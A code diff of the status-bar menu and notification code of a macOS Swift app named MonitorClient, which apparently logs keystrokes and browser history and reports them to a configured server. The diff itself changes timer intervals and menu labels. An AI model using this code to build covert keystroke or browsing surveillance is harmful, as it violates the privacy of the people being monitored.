-        // Check every 30 seconds
+        // Check every 5 minutes (optimized from 30 seconds)
         let lastCheck = storage.double(forKey: "last-accessibility-check")
         let currentTime = Date().timeIntervalSince1970
         
-        if currentTime - lastCheck > 30 {
+        if currentTime - lastCheck > 300 {
             storage.set(currentTime, forKey: "last-accessibility-check")
             
             if !isInputMonitoringEnabled() {
@@ -2756,8 +3096,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Set the menu
         statusBarItem?.menu = statusMenu
         
-        // Start status update timer
-        statusUpdateTimer = Timer.scheduledTimer(timeInterval: 2.0, target: self, selector: #selector(updateStatusMenu), userInfo: nil, repeats: true)
+        // Start status update timer (optimized interval)
+        statusUpdateTimer = Timer.scheduledTimer(timeInterval: 10.0, target: self, selector: #selector(updateStatusMenu), userInfo: nil, repeats: true)
         
         logMessage("Status bar menu setup complete", level: .info)
     }
@@ -2775,8 +3115,17 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         menu.addItem(NSMenuItem.separator())
         
-        // Server status
-        let serverItem = NSMenuItem(title: "Server: Checking...", action: nil, keyEquivalent: "")
+        // Client information
+        let clientItem = NSMenuItem(title: "Client: \(clientIPAddress) / \(macAddress)", action: nil, keyEquivalent: "")
+        clientItem.tag = 99
+        clientItem.isEnabled = false
+        menu.addItem(clientItem)
+        
+        // Server information
+        let serverIP = storage.string(forKey: "server-ip") ?? "Not configured"
+        let serverPort = storage.string(forKey: "server-port") ?? "8924"
+        let serverAddress = serverIP == "Not configured" ? "Not configured" : "\(serverIP):\(serverPort)"
+        let serverItem = NSMenuItem(title: "Server: \(serverAddress)", action: nil, keyEquivalent: "")
         serverItem.tag = 100 // Tag for easy identification
         serverItem.isEnabled = false
         menu.addItem(serverItem)
@@ -2826,22 +3175,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         ticSentItem.isEnabled = false
         menu.addItem(ticSentItem)
         
-        menu.addItem(NSMenuItem.separator())
-        
-        // Manual test actions
-        let testKeyboardItem = NSMenuItem(title: "Test Keyboard Monitoring", action: #selector(testKeyboardMonitoring), keyEquivalent: "")
-        menu.addItem(testKeyboardItem)
-        
-        let testBrowserItem = NSMenuItem(title: "Test Browser History", action: #selector(testBrowserHistoryCollection), keyEquivalent: "")
-        menu.addItem(testBrowserItem)
-        
-        let testServerItem = NSMenuItem(title: "Test Server Connection", action: #selector(testServerConnectivity), keyEquivalent: "")
-        menu.addItem(testServerItem)
-        
-        let testSettingsItem = NSMenuItem(title: "Test Settings", action: #selector(testSettings), keyEquivalent: "")
-        menu.addItem(testSettingsItem)
-        
-        menu.addItem(NSMenuItem.separator())
+
         
         // Settings
         let settingsItem = NSMenuItem(title: "Settings...", action: #selector(openSettingsDialog), keyEquivalent: ",")
@@ -2850,6 +3184,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         let openSettingsItem = NSMenuItem(title: "Open Accessibility Settings", action: #selector(openAccessibilityPreferences), keyEquivalent: "")
         menu.addItem(openSettingsItem)
+        
+        menu.addItem(NSMenuItem.separator())
+        
+        // Manual test actions
+        let startupTestItem = NSMenuItem(title: "Run Startup Tests", action: #selector(performStartupTests), keyEquivalent: "")
+        menu.addItem(startupTestItem)
         
         menu.addItem(NSMenuItem.separator())
         
@@ -2865,18 +3205,21 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         notification.title = "MonitorClient Status"
         
         let serverIP = storage.string(forKey: "server-ip") ?? "Not configured"
+        let serverPort = storage.string(forKey: "server-port") ?? "8924"
         let serverStatus: String
         if serverIP == "Not configured" {
             serverStatus = "Not configured"
         } else {
-            serverStatus = isServerConnected ? "Connected" : "Disconnected"
+            let serverAddress = "\(serverIP):\(serverPort)"
+            serverStatus = "\(serverAddress) (\(isServerConnected ? "Connected" : "Disconnected"))"
         }
         
         let isAccessibilityEnabled = isInputMonitoringEnabled()
         let isKeyboardActive = eventTap != nil && CGEvent.tapIsEnabled(tap: eventTap!)
         
         notification.informativeText = """
-        Server: \(serverStatus)
+        Client: \(clientIPAddress) / \(macAddress)
+        Server: \(serverIP) (\(serverStatus))
         Accessibility: \(isAccessibilityEnabled ? "✅" : "❌")
         Keyboard: \(isKeyboardActive ? "✅" : "❌")
         Keys: \(keyLogs.count)
@@ -2890,13 +3233,20 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     @objc private func updateStatusMenu() {
         guard let menu = statusMenu else { return }
         
+        // Update client information
+        if let clientItem = menu.item(withTag: 99) {
+            clientItem.title = "Client: \(clientIPAddress) / \(macAddress)"
+        }
+        
         // Update server status
         if let serverItem = menu.item(withTag: 100) {
             let serverIP = storage.string(forKey: "server-ip") ?? "Not configured"
+            let serverPort = storage.string(forKey: "server-port") ?? "8924"
             if serverIP == "Not configured" {
-                serverItem.title = "Server: Not configured"
+                serverItem.title = "Server: Not configured ❌"
             } else {
-                serverItem.title = "Server: \(isServerConnected ? "Connected" : "Disconnected")"
+                let serverAddress = "\(serverIP):\(serverPort)"
+                serverItem.title = "Server: \(serverAddress) \(isServerConnected ? "✅" : "❌")"
             }
         }
         
